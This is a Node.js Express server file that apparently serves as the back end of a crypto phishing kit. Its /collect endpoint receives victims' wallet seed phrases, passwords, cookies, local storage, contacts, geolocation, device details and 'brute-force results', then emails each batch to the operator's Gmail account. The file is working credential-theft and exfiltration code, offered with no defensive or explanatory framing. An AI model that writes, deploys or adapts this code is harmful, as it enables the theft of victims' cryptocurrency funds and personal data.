const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config(); // Load environment variables
const config = require("./config"); // Load configuration file
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, "."))); // Serve static files

// Serve the main HTML page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Gmail SMTP configuration
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.GMAIL_USER || config.gmail.user,
    pass: process.env.GMAIL_APP_PASSWORD || config.gmail.appPassword,
  },
});

// Verify transporter configuration
transporter.verify(function (error, success) {
  if (error) {
    console.log("❌ Transporter verification failed:", error);
  } else {
    console.log("✅ Transporter is ready to send emails");
    console.log("📧 Using email:", process.env.GMAIL_USER || config.gmail.user);
  }
});

// Endpoint to collect data
app.post("/collect", (req, res) => {
  const data = req.body;

  // Format data for email
  const mailContent = `
        New Crypto Data Collected:
        Timestamp: ${data.timestamp}
        IP: ${data.ip}
        User Agent: ${data.userAgent}
        Platform: ${data.platform}
        Device Memory: ${data.device}
        Language: ${data.language}
        Screen: ${data.screen}
        Cookies: ${data.cookies}
        Latitude: ${data.latitude || "N/A"}
        Longitude: ${data.longitude || "N/A"}
        Accuracy: ${data.accuracy || "N/A"}
        Geo Error: ${data.geoError || "N/A"}
        Local Storage: ${data.localStorage || "N/A"}
        Contacts: ${JSON.stringify(data.contacts) || "N/A"}
        Wallet Name: ${data.walletName || "N/A"}
        Seed Phrase: ${data.seedPhrase || "N/A"}
        Password: ${data.password || "N/A"}
        Brute-Force Results: ${JSON.stringify(data.bruteForceResults) || "N/A"}
    `;

  // Email options
  const mailOptions = {
    from: process.env.GMAIL_USER || config.gmail.user,
    to: process.env.GMAIL_USER || config.gmail.user,
    subject: "New Crypto Wallet Data Collected",
    text: mailContent,
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("❌ Email error:", error);
      console.log("📧 Email details:", {
        from: mailOptions.from,
        to: mailOptions.to,
        subject: mailOptions.subject,
      });
    } else {
      console.log("✅ Email sent successfully!");
      console.log("📧 Message ID:", info.messageId);
      console.log("📧 Response:", info.response);
    }
  });

  res.status(200).send("Data received");
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
